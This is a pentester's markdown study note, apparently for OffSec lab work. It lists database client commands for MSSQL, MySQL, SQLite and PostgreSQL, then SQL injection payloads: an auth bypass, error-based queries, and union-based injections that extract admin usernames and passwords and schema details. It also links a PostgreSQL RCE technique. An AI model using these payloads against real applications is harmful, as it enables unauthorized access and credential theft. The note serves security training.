1. [[#Commands and queries|Commands and queries]]
	1. [[#Commands and queries#MSSQL|MSSQL]]
	2. [[#Commands and queries#MySQL|MySQL]]
	3. [[#Commands and queries#SQLite3|SQLite3]]
	4. [[#Commands and queries#PostgreSQL|PostgreSQL]]
2. [[#SQL Injections|SQL Injections]]
	1. [[#SQL Injections#Potential vulnerable features|Potential vulnerable features]]
	2. [[#SQL Injections#SQLi Types|SQLi Types]]
		1. [[#SQLi Types#Error based|Error based]]
		2. [[#SQLi Types#Union based attacks|Union based attacks]]

## Commands and queries 
### MSSQL
- Connect to MSSQL server
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
### MySQL
```
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```
- List databases.
```
SHOW DATABASES;
```
- Switch database.
```
USE database_name;
```
- List tables in current database.
```
SHOW TABLES;
```
- Show columns and types.
```
DESCRIBE table_name;
```
- Dump all rows.
```
SELECT * FROM table_name;
```
- Dump first 20 rows.
```
SELECT * FROM table_name LIMIT 20;
```

### SQLite3

- Easiest tool `sqlitebrowser`
```
sqlite3 database_name.db
```
- List tables
```
.tables
```
- Table structure
```
.schema table_name
```
- Dump all tables
  ```
  SELECT * FROM table_name;
  ```

### PostgreSQL
- Connect to DB
```
psql -h $IP -p 5432 -U postgres 
```
- List databases: `\l`
- Connect (select) database: `\c databasename`
- Show tables `\dt`
- Show columns and types `\d table_name`
- Show all rows
```
SELECT * FROM table_name;
```

- RCE authenticated - https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767 
## SQL Injections
### Potential vulnerable features
Potential vulnerable web features
- Search
- Login
- Forms
- Update Information
- Register
- Forgot password

### SQLi Types
#### Error based
- Testing
```
offsec'
```
- Auth bypass
```mysql
offsec' OR 1=1 -- //
```
- execute queries
```mysql
' or 1=1 in (select @@version) -- //
```
Commands can be changed depending on the query language. [Cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
#### Union based attacks
Both queries must return the same number of columns. So need to find the column count
**You may have to use %' rather than ' to break queries that contain %**
```
' ORDER BY 1--
```

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--  <-- Success! Column count is 3.
```
Identify each column
```
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```
Return data
```
' UNION SELECT username, password, NULL FROM admin_users--
```
Return column structures
```
' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--
```
